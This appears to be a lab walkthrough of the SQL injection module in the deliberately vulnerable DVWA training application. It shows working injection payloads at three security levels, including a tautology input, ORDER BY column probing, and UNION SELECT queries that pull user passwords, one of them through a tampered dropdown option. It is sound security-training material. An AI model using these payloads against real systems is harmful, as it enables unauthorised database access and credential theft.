# SQL Injection

> #### Objective
>
> There are 5 users in the database, with id's from 1 to 5. Your mission... to steal their passwords via SQLi.

##

## Security Level: Low

> The SQL query uses RAW input that is directly controlled by the attacker. All they need to-do is escape the query and then they are able to execute any SQL query they wish. Spoiler: ?id=a' UNION SELECT "text1","text2";-- -\&Submit=Submit.&#x20;

<figure><img src="../.gitbook/assets/1 (42).png" alt=""><figcaption></figcaption></figure>

* We can provide a user ID `1` to the application.&#x20;

<figure><img src="../.gitbook/assets/2 (39).png" alt=""><figcaption></figcaption></figure>

* So the user input is inserted in the following query:

```
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```

* Let's check the source code to see how the application behaves.

<figure><img src="../.gitbook/assets/3 (36).png" alt=""><figcaption></figcaption></figure>

* As we can see, the user input is not sanitized in any way. This is what leaves an application vulnerable to SQLi.
* Let's provide the following input:

```
1' OR '1'='1
```

* Our input causes the application to create the following query:

```
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

* As 1 is always equal to 1, all the users first and last name will be output to the page regardless of whether their id is 1 or not.

<figure><img src="../.gitbook/assets/4 (34).png" alt=""><figcaption></figcaption></figure>

* Our job in not done though, we need to find the passwords for the users using a `UNION` attack.
* For a `UNION` query to work, two key requirements must be met:
  1. The individual queries must return the same number of columns.
  2. The data types in each column must be compatible between the individual queries.
* We can find the number of columns using the following queries provided by Portswigger one by one:

```
' ORDER BY 1#
' ORDER BY 2# 
' ORDER BY 3#
```

* We will be able to notice that the first two queries do not return any result but the third query returns a blank screen.
* This means that there are two columns in the current table.
* Let's create our final payload:

```
' UNION SELECT user, password FROM users#
```

<figure><img src="../.gitbook/assets/5 (34).png" alt=""><figcaption></figcaption></figure>

##

## Security Level: Medium

> The medium level uses a form of SQL injection protection, with the function of "[mysql\_real\_escape\_string()](https://secure.php.net/manual/en/function.mysql-real-escape-string.php)". However due to the SQL query not having quotes around the parameter, this will not fully protect the query from being altered. The text box has been replaced with a pre-defined dropdown list and uses POST to submit the form. Spoiler: ?id=a UNION SELECT 1,2;-- -\&Submit=Submit.

<figure><img src="../.gitbook/assets/6 (34).png" alt=""><figcaption></figcaption></figure>

* Let's first check the source code.

<figure><img src="../.gitbook/assets/7 (30).png" alt=""><figcaption></figcaption></figure>

* In this level our input is not inserted into quotes.
* We can inspect the code for more information.&#x20;

<figure><img src="../.gitbook/assets/8 (23).png" alt=""><figcaption></figcaption></figure>

* Let's change the `<option>` tag to the following value:

```
<option value="1 OR 1=1">1 OR 1=1</option>
```

<figure><img src="../.gitbook/assets/9 (17).png" alt=""><figcaption></figcaption></figure>

* In order to retrieve the passwords, we can set the `<option>` tag to the following value:

```
<option value="1 UNION SELECT user, password FROM users#">1 UNION SELECT user, password FROM users#</option>
```

<figure><img src="../.gitbook/assets/10 (14).png" alt=""><figcaption></figcaption></figure>

##

## Security Level: High

> This is very similar to the low level, however this time the attacker is inputting the value in a different manner. The input values are being transferred to the vulnerable query via session variables using another page, rather than a direct GET request. Spoiler: ID: a' UNION SELECT "text1","text2";-- -\&Submit=Submit.

<figure><img src="../.gitbook/assets/11 (6).png" alt=""><figcaption></figcaption></figure>

* Let's check the source code.

<figure><img src="../.gitbook/assets/12 (3).png" alt=""><figcaption></figcaption></figure>

* The application treats our input the same way it did in the low security level.
* That means the same payload as the low security level should work in this level.

```
' UNION SELECT user, password FROM users#
```

<figure><img src="../.gitbook/assets/13 (5).png" alt=""><figcaption></figcaption></figure>
